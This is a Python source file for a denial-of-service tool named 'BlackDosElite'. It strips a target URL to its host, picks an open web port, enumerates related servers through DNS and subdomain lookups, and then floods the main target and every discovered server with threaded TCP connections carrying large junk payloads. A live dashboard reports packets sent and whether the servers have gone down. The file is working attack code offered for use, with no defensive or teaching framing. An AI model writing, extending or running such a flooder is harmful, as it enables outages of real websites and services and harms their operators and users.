import socket
import threading
import time
import random
import dns.resolver
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

class BlackDosElite:
    def __init__(self):
        self.packet_count = 0
        self.running = True
        self.start_time = time.time()
        self.console = Console()
        self.discovered_servers = []
        self.main_target = None
        self.current_port = None
        self.active_threads = 0
        self.amplification_factor = 1000

    def resolve_target(self, url):
        clean_url = url.replace('https://', '').replace('http://', '').split('/')[0]
        return clean_url

    def get_optimal_port(self, target):
        common_ports = [80, 443, 8080, 8443]
        for port in common_ports:
            if self.monitor_server_status(target, port) == "🟢 ONLINE":
                return port
        return 80

    def discover_related_servers(self, main_target):
        servers = []
        try:
            answers = dns.resolver.resolve(main_target, 'A')
            servers.extend(str(rdata) for rdata in answers)
            
            answers = dns.resolver.resolve(main_target, 'CNAME')
            servers.extend(str(rdata) for rdata in answers)
            
            subdomains = ['www', 'api', 'mail', 'ftp', 'cdn', 'cloud', 'server']
            for sub in subdomains:
                try:
                    subdomain = f"{sub}.{main_target}"
                    answers = dns.resolver.resolve(subdomain, 'A')
                    servers.extend(str(rdata) for rdata in answers)
                except:
                    continue
        except:
            servers.append(main_target)
        
        return list(set(servers))

    def monitor_server_status(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.close()
            return "🟢 ONLINE"
        except:
            return "💀 DOWN"

    def count_down_servers(self):
        down_count = 0
        for server in self.discovered_servers:
            if self.monitor_server_status(server, self.current_port) == "💀 DOWN":
                down_count += 1
        return down_count

    def amplified_tcp_flood(self, target, port):
        payload_sizes = [1024, 2048, 4096, 8192, 16384, 32768, 65500]
        while self.running:
            try:
                for _ in range(self.amplification_factor):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    payload = b"X" * random.choice(payload_sizes)
                    s.send(payload * random.randint(1, 10))
                    self.packet_count += 1
            except:
                continue

    def generate_attack_status(self):
        table = Table(title="[bold red]ELITE DOS ATTACK DASHBOARD[/bold red]")
        
        table.add_column("TARGET", style="cyan")
        table.add_column("PORT", style="green")
        table.add_column("STATUS", style="red")
        table.add_column("PACKETS", style="yellow")
        table.add_column("POWER", style="magenta")
        table.add_column("SERVER STATE", style="blue")
        
        elapsed = time.time() - self.start_time
        power = self.packet_count * 65500 / (1024*1024*1024)

        main_status = self.monitor_server_status(self.main_target, self.current_port)
        table.add_row(
            self.main_target,
            str(self.current_port),
            "🔥 NUKING",
            f"{self.packet_count:,}",
            f"{power:.2f} GB",
            main_status
        )

        for server in self.discovered_servers:
            server_status = self.monitor_server_status(server, self.current_port)
            table.add_row(
                server,
                str(self.current_port),
                "⚡ FLOODING",
                f"{self.packet_count:,}",
                f"{power:.2f} GB",
                server_status
            )

        attack_stats = Text.from_markup(f"""
[bold red]ATTACK STATISTICS[/bold red]
🎯 Main Target: {self.main_target}
🌐 Related Servers: {len(self.discovered_servers)}
💣 Total Packets: {self.packet_count:,}
⚡ Attack Power: {power:.2f} GB
🕒 Attack Duration: {int(elapsed)}s

[bold green]SERVER STATUS[/bold green]
Main Server: {main_status}
Related Servers Down: {self.count_down_servers()}/{len(self.discovered_servers)}

[bold yellow]NETWORK IMPACT[/bold yellow]
🔥 Network Stress: MAXIMUM
⚡ Infrastructure Load: CRITICAL
🌊 Flood Intensity: EXTREME
    """)

        combined_display = str(table) + "\n" + str(attack_stats)
        return Panel(combined_display)

    def launch_attack(self, target, port, threads):
        # Resolve the real target
        self.main_target = self.resolve_target(target)
        
        # Get optimal port if not specified
        self.current_port = port if port else self.get_optimal_port(self.main_target)
        
        self.discovered_servers = self.discover_related_servers(self.main_target)
        
        self.console.print(f"[bold green]Target Resolved: {self.main_target}")
        self.console.print(f"[bold green]Optimal Port Selected: {self.current_port}")
        
        with Live(self.generate_attack_status(), refresh_per_second=1) as live:
            with ThreadPoolExecutor(max_workers=threads * (len(self.discovered_servers) + 1)) as executor:
                futures = []
                # Attack main target
                futures.extend([executor.submit(self.amplified_tcp_flood, self.main_target, self.current_port) 
                              for _ in range(threads)])
                
                # Attack discovered servers
                for server in self.discovered_servers:
                    futures.extend([executor.submit(self.amplified_tcp_flood, server, self.current_port) 
                                  for _ in range(threads)])
                
                while self.running:
                    live.update(self.generate_attack_status())
                    time.sleep(0.5)
